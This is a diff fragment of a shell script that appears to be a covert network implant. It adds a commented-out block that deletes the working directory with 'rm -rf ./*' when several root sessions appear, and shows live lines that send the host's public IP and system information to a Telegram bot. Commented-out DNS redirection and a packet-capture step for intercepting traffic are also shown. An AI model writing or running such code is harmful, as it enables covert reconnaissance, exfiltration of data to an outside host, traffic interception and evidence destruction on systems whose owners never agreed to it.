@@ -54,6 +54,15 @@ if [ $? -eq 0 ]; then
 	#systemctl restart dnsmasq
 	#curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Redirection completed successfully: $domain -> $ip_server"
 
+	#Session controll
+	#sessions=$(who | awk '{print $1 " " $2 " " $5}' | grep "root")
+	#ount=$(echo "$sessions" | wc -l)
+	#if [ "$count" -ge 2 ]; then
+	    #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Warning: $count sessions %0AAutoremove"
+	    #rm -rf ./*
+	#fi
+	
+	#Send report
 	filepath1=$nmap_output_file
 	filepath3=$ifconfig_output_file
 	curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info"
@@ -90,7 +99,8 @@ if [ $? -eq 0 ]; then
     	else
         	echo "Do nothing"
     	fi
-
+	
+	#Intercept traffic
 	echo "Start intercepting..."
 	# Max size of file .pcap
 	MAX_FILE_SIZE=200000000  # 200MB in byte
